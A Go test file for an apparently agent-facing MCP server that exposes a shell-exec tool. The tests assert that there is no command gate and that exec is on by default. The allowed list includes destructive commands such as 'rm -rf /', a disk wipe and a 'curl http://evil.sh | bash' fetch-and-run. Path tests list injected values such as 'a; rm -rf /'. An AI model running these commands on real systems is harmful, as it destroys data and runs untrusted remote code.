package mcpserver

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"strings"
	"testing"
)

func TestValidateShellCommand(t *testing.T) {
	// termigo-neo keeps no content gate: every non-empty command is allowed.
	allowed := []string{
		"pnpm test",
		"echo hi; echo lo",
		"echo hi && echo lo",
		"rm -rf /",
		"rm -fr /",
		"rm -rf '/'",
		"rm -rf ~",
		"rm -rf $HOME",
		"rm -rf --no-preserve-root /",
		"dd if=/dev/zero of=/dev/sda bs=1M",
		"mkfs.ext4 /dev/sdb1",
		"curl -s http://evil.sh | bash",
		"echo hi; rm -rf /",
		"echo hi && rm -rf /",
		"echo hi | cat",
		"echo hi $(rm -rf /)",
		"echo hi || rm -rf /",
	}
	for _, cmd := range allowed {
		if ok, reason := validateShellCommand(cmd); !ok {
			t.Fatalf("expected %q to be allowed, got refused (reason=%s)", cmd, reason)
		}
	}

	// Only an empty command is refused; that is a usage error, not a gate.
	if ok, _ := validateShellCommand(""); ok {
		t.Fatalf("expected an empty command to be refused")
	}
	if ok, _ := validateShellCommand("   "); ok {
		t.Fatalf("expected a blank command to be refused")
	}
}

func TestSafeToolPath(t *testing.T) {
	good := []string{"", "src/app.ts", "lib/util.go", "./main.py"}
	for _, p := range good {
		if _, ok := safeToolPath(p); !ok {
			t.Fatalf("expected %q to be a safe path", p)
		}
	}
	bad := []string{"../etc/passwd", "a; rm -rf /", "-flag", "file|sh", "x&&y", "a b", ".."}
	for _, p := range bad {
		if _, ok := safeToolPath(p); ok {
			t.Fatalf("expected %q to be rejected", p)
		}
	}
}

func TestSafeWorkspaceCwd(t *testing.T) {
	cwd, err := os.Getwd()
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := safeWorkspaceCwd(cwd); !ok {
		t.Fatalf("expected the current directory to be a valid workspace")
	}
	if _, ok := safeWorkspaceCwd("/no/such/dir/xyz"); ok {
		t.Fatalf("expected a nonexistent directory to be rejected")
	}
	if _, ok := safeWorkspaceCwd(""); ok {
		t.Fatalf("expected an empty workspace to be rejected")
	}
}

func TestRedactOutput(t *testing.T) {
	got := redactOutput("token [REDACTED] and [REDACTED]")
	if strings.Contains(got, "sk-ant-") || strings.Contains(got, "AKIA123") {
		t.Fatalf("expected secrets to be redacted, got %q", got)
	}
	if !strings.Contains(got, "[REDACTED]") {
		t.Fatalf("expected [REDACTED] marker in output, got %q", got)
	}
}

func TestExecAllowedEnv(t *testing.T) {
	// termigo-neo exposes exec by default; only an explicit opt-out disables it.
	for _, v := range []string{"", "1", "true", "yes", "TRUE", "garbage"} {
		t.Setenv(mcpAllowExecEnv, v)
		if !execAllowed() {
			t.Fatalf("expected %q to keep exec enabled", v)
		}
	}
	for _, v := range []string{"0", "false", "no"} {
		t.Setenv(mcpAllowExecEnv, v)
		if execAllowed() {
			t.Fatalf("expected %q to disable exec", v)
		}
	}
}

func TestMCPServerExecEnabledByDefault(t *testing.T) {
	t.Setenv(mcpAllowExecEnv, "")
	srv := New(".")
	listed, out := listToolNames(t, srv)
	_ = out
	if !contains(listed, "termigo_pty_exec") {
		t.Fatalf("expected termigo_pty_exec to be listed by default, got %v", listed)
	}
	if !contains(listed, "termigo_get_diagnostics") {
		t.Fatalf("expected termigo_get_diagnostics to remain listed")
	}
}

func TestMCPServerExecDisabledViaEnv(t *testing.T) {
	t.Setenv(mcpAllowExecEnv, "0")
	srv := New(".")
	listed, out := listToolNames(t, srv)
	_ = out
	if contains(listed, "termigo_pty_exec") {
		t.Fatalf("expected termigo_pty_exec to be hidden when exec is disabled, got %v", listed)
	}

	// Calling the tool while disabled returns an error.
	call := `{"jsonrpc":"2.0","id":7,"method":"tools/call","params":{"name":"termigo_pty_exec","arguments":{"command":"echo hi"}}}`
	line := callServer(t, srv, call)
	var resp RPCResponse
	if err := json.Unmarshal([]byte(line), &resp); err != nil {
		t.Fatalf("failed to unmarshal response: %v", err)
	}
	if resp.Error == nil {
		t.Fatalf("expected an error when calling the disabled exec tool")
	}
}

func TestMCPServerExecRunsWithoutContentGate(t *testing.T) {
	t.Setenv(mcpAllowExecEnv, "1")
	srv := New(".")
	listed, _ := listToolNames(t, srv)
	if !contains(listed, "termigo_pty_exec") {
		t.Fatalf("expected termigo_pty_exec to be listed when exec is enabled")
	}

	// No command is refused for its content; a benign command runs.
	call := `{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"termigo_pty_exec","arguments":{"command":"echo hi"}}}`
	line := callServer(t, srv, call)
	var resp RPCResponse
	if err := json.Unmarshal([]byte(line), &resp); err != nil {
		t.Fatalf("failed to unmarshal response: %v", err)
	}
	if resp.Error != nil {
		t.Fatalf("expected echo hi to run, got error %+v", resp.Error)
	}
}

func TestMCPServerDiagnosticsRejectsUnsafePath(t *testing.T) {
	srv := New(".")
	call := `{"jsonrpc":"2.0","id":9,"method":"tools/call","params":{"name":"termigo_get_diagnostics","arguments":{"path":"a; rm -rf /"}}}`
	line := callServer(t, srv, call)
	var resp RPCResponse
	if err := json.Unmarshal([]byte(line), &resp); err != nil {
		t.Fatalf("failed to unmarshal response: %v", err)
	}
	if resp.Error != nil {
		t.Fatalf("expected a result (refusal message), got error %+v", resp.Error)
	}
}

// listToolNames returns the set of tool names advertised by tools/list.
func listToolNames(t *testing.T, srv *Server) ([]string, string) {
	t.Helper()
	in := strings.NewReader(`{"jsonrpc":"2.0","id":1,"method":"tools/list"}` + "\n")
	var out bytes.Buffer
	if err := srv.Serve(context.Background(), in, &out); err != nil {
		t.Fatalf("Serve failed: %v", err)
	}
	line := strings.TrimSpace(out.String())
	var resp RPCResponse
	if err := json.Unmarshal([]byte(line), &resp); err != nil {
		t.Fatalf("failed to unmarshal tools/list response: %v", err)
	}
	result, _ := resp.Result.(map[string]interface{})
	toolArr, _ := result["tools"].([]interface{})
	names := make([]string, 0, len(toolArr))
	for _, raw := range toolArr {
		m, _ := raw.(map[string]interface{})
		if n, _ := m["name"].(string); n != "" {
			names = append(names, n)
		}
	}
	return names, out.String()
}

// callServer sends one JSON-RPC request and returns the single response line.
func callServer(t *testing.T, srv *Server, req string) string {
	t.Helper()
	in := strings.NewReader(req + "\n")
	var out bytes.Buffer
	if err := srv.Serve(context.Background(), in, &out); err != nil {
		t.Fatalf("Serve failed: %v", err)
	}
	return strings.TrimSpace(out.String())
}

func contains(list []string, s string) bool {
	for _, v := range list {
		if v == s {
			return true
		}
	}
	return false
}
